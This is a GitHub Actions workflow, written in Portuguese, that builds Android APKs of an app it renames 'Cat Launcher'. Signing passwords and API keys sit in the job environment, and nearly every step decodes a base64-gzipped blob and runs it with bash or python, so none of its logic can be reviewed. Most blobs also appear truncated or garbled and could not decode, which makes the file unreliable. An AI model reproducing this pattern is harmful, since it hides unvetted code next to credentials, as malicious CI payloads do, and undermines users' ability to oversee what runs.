name: cat launcher
on:
  workflow_dispatch:
    inputs:
      arch:
        description: Arquitetura do APK
        required: true
        default: all
        type: choice
        options: ["all", "arm64", "arm", "x86", "x86_64"]
      build_type:
        description: Tipo de build
        required: true
        default: auto
        type: choice
        options: ["auto", "debug", "release", "both"]
  push:
    branches:
    - '**'
permissions:
  contents: read
env:
  REPORT_DIR: /tmp/zreport
  SRC_ROOT: /home/runner/zalith-src
  ARCH: ${{ github.event.inputs.arch || 'all' }}
  BUILD_TYPE: ${{ github.event.inputs.build_type || 'auto' }}
  UPSTREAM_REF: main
jobs:
  build:
    name: Verificar, corrigir e compilar
    runs-on: ubuntu-24.04
    timeout-minutes: 150
    defaults:
      run:
        shell: bash
    env:
      STORE_PASSWORD: ${{ secrets.STORE_PASSWORD }}
      KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
      OAUTH_CLIENT_ID: ${{ secrets.OAUTH_CLIENT_ID }}
      CURSEFORGE_API_KEY: ${{ secrets.CURSEFORGE_API_KEY }}
    steps:
    - name: Checkout do repositório
      uses: actions/checkout@v6
      with:
        lfs: true
    - name: Liberar espaço em disco e preparar relatório
      run: |
        sudo rm -rf /usr/share/dotnet /opt/ghc /usr/local/share/boost || true
        mkdir -p "$REPORT_DIR" "$SRC_ROOT"
        : > "$REPORT_DIR/problems.txt"
        : > "$REPORT_DIR/fixed.txt"
    - name: Verificação 1/4 - ZIPs
      run: |
        base64 -d <<'ZZ' | gunzip > /tmp/s2.sh
        
        
        
        7g+gUbf83O8+ZYJa9wxfcpmqsEI50Wx1BEppl8M3q9W+1qM56Vyct0+Dv+FZyi37hpYGIUaaB4PzQsQ8xi5QridB91kqpJMnD+xRJBHUolIgpslxNv/E2oGbDX4ZD/o3g9eheziv7L8Ob0bvhmStdHxkGl2FrlowZ7sv4cuqDYY/McfyT6ZqGNm/qffibB5TMMQlGBUrusDa0q8h51rzgi9BcrjHQiQi4rvfSaMmrUe188To1vkb2aUIQUgGAAA=
        ZZ
        bash /tmp/s2.sh
    - name: Verificação 2/4 - extrair
      run: |
        base64 -d <<'ZZ' | gunzip > /tmp/s3.sh
        
        PscTx2J3jg/YZoiKTqCWeOcOzaW05sQM7TYrzfv+jOuEmCXwOWl2Sv5jjs6v35Nq0bidGe3pdJTNw1uytt7lpuT1OV6P/yjMIsFqw3AZdu8u7+gmsCvJTtepYKmCb3D/CniujsMEhWMHxPUekTe/4fkx+AItlYJxRAIAAA==
        ZZ
        bash /tmp/s3.sh
    - name: Completar arquivos faltantes
      run: |
        base64 -d <<'ZZ' | gunzip > /tmp/s4.sh
        
        
        
        mToqu3K4p5ykskYwMC4y1l5tnnnEkZjXl8MOYAxBvrvC3WWMYDk5ejWLtjJ/FRoVli27soydUdnb3uHqhXM4b/pl/NiTYu144JpXxXB4V5RupIu/Y48sFo2WVfT0H4dmWyPhBwAA
        ZZ
        bash /tmp/s4.sh
    - name: Verificação 3/4 - estrutura do projeto
      run: |
        base64 -d <<'B64' | gunzip | python3 -
        
        
        
        
        
        
        
        
        
        
        +RdzGZ//xRQAAA==
        B64
    - name: Verificação 4/4 - correção automática
      run: |
        base64 -d <<'ZZ' | gunzip > /tmp/s6.sh
        
        
        
        
        
        Dzivn1f741TyuCvcpaamHIpD4ofe8C7DuxTPX8JPNtZBxpyD7w1GIw5Nsxu6G2YulyImpuxHOK8ezP87nJOPcpk/QvmjMO1GIIKlX+cfbKy7g5fsUdRRaT5j35NymhBF41NFhGabzAXEhdHoGiIjHqhT/Luzrq1RkqPav2DbEjgNCgAA
        ZZ
        bash /tmp/s6.sh
    - name: Adicionar Java 21 e 25 ao projeto
      run: |
        base64 -d <<'ZZ' | gunzip > /tmp/s7.sh
        
        oXpe2N5mW0dWUw6icqg9BlKwQm5PENOyOelIzv9cEpnDKWt8jnUAvkBNAH5mxU1Z8ZksVA6Dh3J7D1pn0iuF9V245Bmuua6Uqh9UDG1TwUHQ7/OvNeo0Diu0IPy/8pt7ySUJz8J843SbLcIcmKr9V58oMdPlLwMAAA==
        ZZ
        bash /tmp/s7.sh
    - name: Instalar JDKs necessários
      uses: actions/setup-java@v4
      with:
        distribution: temurin
        java-version: ${{ env.JDK_LIST }}
    - name: Instalar Android SDK
      run: |
        base64 -d <<'ZZ' | gunzip > /tmp/s9.sh
        
        avp5hSy18XNlFKaHEup1yFeUG8Aafvso2iPXB161Cf+ICAUZD1i6VGU4CMLQn1ej2fC+F991Z0P02atsqqJa5QzGD98p0/51PImi2Z+0LbOw+7Ej7HNMmbS+GRLK1kQWQsBpWG/BbgfOFCx4B+1u7hxfAgAA
        ZZ
        bash /tmp/s9.sh
    - name: Instalar NDK
      if: env.NDK_VERSION != ''
      run: |
        yes | sdkmanager --licenses >/dev/null 2>&1 || true
        sdkmanager "ndk;${NDK_VERSION}" 2>&1 | tee "$REPORT_DIR/ndk.log"
        echo "ANDROID_NDK_HOME=$ANDROID_HOME/ndk/${NDK_VERSION}" >> "$GITHUB_ENV"
        echo "ANDROID_NDK_ROOT=$ANDROID_HOME/ndk/${NDK_VERSION}" >> "$GITHUB_ENV"
    - name: Instalar Rust (se o projeto usar)
      if: env.HAS_RUST == 'true'
      run: |
        rustup toolchain install stable --profile minimal
        rustup default stable
        rustup target add aarch64-linux-android armv7-linux-androideabi i686-linux-android x86_64-linux-android
        cargo install cargo-ndk --locked 2>&1 | tail -n 5
    - name: Gerar Cargo.lock ausente
      if: env.HAS_RUST == 'true'
      run: |
        find "$SRC_ROOT" -name Cargo.toml -not -path '*/target/*' | while read -r t; do
          [ -f "$(dirname "$t")/Cargo.lock" ] || { echo "Gerando Cargo.lock em $t"; cargo generate-lockfile --manifest-path "$t"; }
        done
    - name: Corrigir jni_bridge.rs
      if: env.HAS_RUST == 'true'
      run: |
        base64 -d <<'ZZ' | gunzip > /tmp/s13.sh
        
        gayVHus5W4AepcPXBZ4DSx5BIvkOZnlyAbntWmTqsnd5NLXO5DP47lrrFvkpQoF8OJZF+Sj7VJ2it/QtFDHC1j99gYGzd/wPr9DyX16DwghHaTqsR7wYjbD+b0WvxmorlKzIuhhdK1TM/2eATBXjnoysnj7GwwNBbahDcgf2F+MBcEz3n2wP4XVG+1lro9khXtG1svBhIir2r6WsNTb73xAbf0VjV/coPY0h5Wg2Z8Eb2M1zp4QCAAA=
        ZZ
        bash /tmp/s13.sh
    - name: Reparar comentarios Kotlin (startup)
      run: |
        base64 -d <<'ZZ' | gunzip > /tmp/s14.sh
        
        
        /X7UjpIlLV3asPAkDVYc21ToxnClfzA4eLn4DKlwzriegRO2qxsBNHOi5jGlt0+uQeNGDDjCOxyaHZ3yIna0tE5pH8NW2NrV3BSQ2rSh0cNj9AfW5dfGSwQAAA==
        ZZ
        bash /tmp/s14.sh
    - name: Configurar Gradle
      uses: gradle/actions/setup-gradle@v4
    - name: Decidir tipos de build
      run: |
        base64 -d <<'ZZ' | gunzip > /tmp/s16.sh
        
        rYZ/f53sE3qynYNeAQAA
        ZZ
        bash /tmp/s16.sh
    - name: Trocar nome e ícone do app (Cat Launcher)
      run: |
        base64 -d <<'ZZ' | gunzip > /tmp/s17.sh
        
        
        
        JUwqe/TnlBoXJGOA6Y6pfCYe9wmvkP534R/j/kZJqwkwbOfgeFvJcmobedXbDX19pjEEK9Oa4oGmOk3QbOGV+f2ngXcFaF/i3R7Vm00NS6wzeDpdqmwj1XcllM0Fl7xjbxUy4uZIG04Ya4qn/AvqYJpnal3Ay+i1TPlCXv0X/vp5WUaTZYNZIjhVKJEsJkIhmgIeFU/mz4WOPhdBkdrRmSLrN5MUcD0BBgAA
        ZZ
        bash /tmp/s17.sh
    - name: Criar keystore de debug ausente
      run: |
        base64 -d <<'ZZ' | gunzip > /tmp/s18.sh
        
        5lKUVvwCy75AdzsBAAA=
        ZZ
        bash /tmp/s18.sh
    - name: Corrigir import kotlinx.coroutines.cancel (FastStartupLoader)
      run: |
        base64 -d <<'ZZ' | gunzip > /tmp/s19.sh
        H4sIAAAAAAACA4XOy2rDMBCF4b2f4tSYuIXIbtehq4KhEAgk3fWGkEb1EFtSpAmkkIePqZtl6Xb4z8dkEigKiBzJaR6K7rG6dewtymq3ffrcbjYvJZR8R4KD8nokdDrLTnSSY1wHbSk1e8EZPWkL9XBXsMPrlE5CV+IdiwVu8JUoQh1Qf/AYQxLsgwzsT40JKRyFPeXGaG9oqOqf4QrSky+ATJPKqO+X7XXb5rb9j3nz13j2JolMH1A+z2dt2XDw2gbQiDmYn/So/8R/LcfFBU7Jb4w5AQAA
        ZZ
        bash /tmp/s19.sh
    - name: Compilar Debug
      if: env.BUILD_DEBUG == 'true'
      run: |
        cd "$PROJECT_DIR"
        bash /tmp/gb.sh assembleDebug debug
    - name: Compilar Release
      if: env.BUILD_RELEASE == 'true'
      run: |
        cd "$PROJECT_DIR"
        bash /tmp/gb.sh assembleRelease release
    - name: Coletar APKs
      if: always()
      run: |
        base64 -d <<'ZZ' | gunzip > /tmp/s22.sh
        
        bDF/5LiKwYVS5yiOB1I34jq6KQ7ZY4B/nPH3fqvlhhojlO8hik68d1Y/gWRE6h7uMm5p3dvk5+OGvQLLKk24+x9YGQSquPiMY9brjpj94d4xO6VFBT6ZbEWjpV5NJq+ki7bELHnBihqRVWPOaCctbtgvkmOyLQ8CAAA=
        ZZ
        bash /tmp/s22.sh
    - name: Publicar APKs
      if: always()
      uses: actions/upload-artifact@v4
      with:
        name: Cat Launcher
        path: /tmp/apks/*.apk
        if-no-files-found: warn
    - name: Publicar logs
      if: always()
      uses: actions/upload-artifact@v4
      with:
        name: Logs do build
        path: /tmp/zreport/*
        if-no-files-found: ignore
        
